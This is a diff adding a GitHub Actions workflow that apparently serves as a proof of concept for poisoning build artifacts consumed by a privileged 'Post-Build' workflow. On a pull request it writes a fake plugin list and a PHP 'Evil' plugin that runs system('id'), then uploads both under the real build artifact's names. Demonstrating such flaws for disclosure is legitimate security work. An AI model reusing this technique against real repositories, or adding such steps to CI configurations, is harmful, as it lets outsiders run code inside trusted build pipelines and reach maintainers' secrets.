@@ -1,0 +1,28 @@
+name: Build
+on:
+  pull_request:
+permissions:
+  contents: read
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Craft attacker-controlled build artifact
+        run: |
+          mkdir -p build/mirror
+          printf 'poc\tmirror\tevil\n' > build/plugins.tsv   # src  mirror  slug
+          cat > build/mirror/evil.php <<'PHP'
+          <?php
+          /**
+           * Plugin Name: Evil
+           * Version: 1.0.0
+           */
+          echo "=== PWNED: attacker artifact code executed in the privileged Post-Build workflow ===\n";
+          system('id');
+          PHP
+          tar -cJf jetpack-build.tar.xz build
+      - uses: actions/upload-artifact@v4
+        with: { name: jetpack-build.tar.xz, path: jetpack-build.tar.xz }
+      - uses: actions/upload-artifact@v4
+        with: { name: plugins.tsv, path: build/plugins.tsv }
